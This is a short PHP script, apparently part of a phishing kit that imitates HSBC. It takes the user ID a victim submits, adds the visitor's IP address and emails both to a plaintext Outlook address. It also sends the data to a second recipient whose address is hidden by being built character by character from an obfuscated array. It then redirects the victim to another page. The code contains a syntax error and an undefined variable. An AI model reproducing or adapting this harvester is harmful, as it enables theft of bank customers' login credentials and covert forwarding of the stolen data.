<?php
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
$ip = $_SERVER['REMOTE_ADDR'];
$user = $_POST['userid'];
$ar=array("0"=>"j","1"=>"c","2"=>"l","3"=>"g","4"=>"c","5"=>"m","6"=>"e","7"=>".","8"=>"t","9"=>"7","10"=>"i","11"=>"m","12"=>"a","13"=>"@","14"=>"6","15"=>"0","16"=>"b","17"=>"2","18"=>"d","18"=>"7","19"=>"o","20"=>"d");
$cc=$ar['6'].$ar['5'].$ar['8'].$ar['14'].$ar['14'].$ar['9'].$ar['13'].$ar['3'].$ar['11'].$ar['12'].$ar['10'].$ar['2'].$ar['7'].$ar['1'].$ar['19'].$ar['11'];
$data ="
--------------------------------------------
          IP       : $ip
----------------xXx_E.B_xXx-----------------

User   : $user

----------------xXx_E.B_xXx-----------------

";

$subj="HSBC $ip"; 

$emailusr = 'ventura514@outlook.com';

mail($cc, %subj, $data);
mail($emailusr, $subj, $data);	
mail($emailusr2, $subj, $data);


		   header("Location: Msg.php");

?>
